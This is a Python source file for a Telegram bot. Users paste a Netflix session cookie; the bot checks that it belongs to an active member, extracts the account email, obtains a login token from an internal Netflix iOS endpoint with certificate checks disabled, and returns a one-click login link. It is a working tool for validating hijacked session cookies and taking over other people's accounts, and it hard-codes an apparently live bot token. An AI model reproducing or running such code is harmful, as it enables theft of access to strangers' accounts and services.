import re
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

print("Bot Started...")

def load_cookies(text):
    print("Received text length:", len(text))
    text = text.strip()
    cookies = {}

    # Super aggressive extraction
    match = re.search(r'NetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["NetflixId"] = match.group(1)
        print("Found NetflixId:", cookies["NetflixId"][:30] + "...")
    else:
        print("NetflixId not found with first pattern")

    if not cookies.get("NetflixId"):
        match = re.search(r'NetflixId["\s:=]+([^"\s,;]+)', text, re.IGNORECASE)
        if match:
            cookies["NetflixId"] = match.group(1)
            print("Found with second pattern")

    return cookies

def check_account(cookies):
    if not cookies.get("NetflixId"):
        print("No NetflixId in check_account")
        return None

    try:
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        sess.cookies.set("NetflixId", cookies["NetflixId"], domain=".netflix.com")

        r = sess.get("https://www.netflix.com/account", timeout=20, allow_redirects=True)
        print("Status Code:", r.status_code)

        if "login" in r.url.lower() or r.status_code in (401, 403):
            print("Redirected to login")
            return None

        html = r.text
        if '"membershipStatus":"CURRENT_MEMBER"' not in html:
            print("Not a current member")
            return None

        email = re.search(r'"emailAddress":"([^"]+)"', html)
        email = email.group(1) if email else "N/A"

        # NFT Token
        tok = None
        try:
            headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={cookies['NetflixId']}"}
            r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
            if r2.status_code == 200:
                data = r2.json()
                tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
        except Exception as e:
            print("NFT Token Error:", e)

        if tok:
            safe = urllib.parse.quote(tok)
            login_pc = f"https://netflix.com/?nftoken={safe}"
        else:
            login_pc = "N/A"

        return {
            "email": email,
            "login_pc": login_pc,
            "login_tv": "https://www.netflix.com/tv2"
        }
    except Exception as e:
        print("Check Account Error:", str(e))
        return None

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie now:")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    print("Received message from:", message.chat.id)
    cookies = load_cookies(message.text)

    if not cookies.get("NetflixId"):
        bot.reply_to(message, "❌ NetflixId not found in your paste.")
        return

    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX ACCOUNT</b>

📧 <code>{result['email']}</code>

🔗 NFT Token Login:
    """

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 PC Login", url=result["login_pc"]))
    markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("Bot is listening...")
bot.infinity_polling()
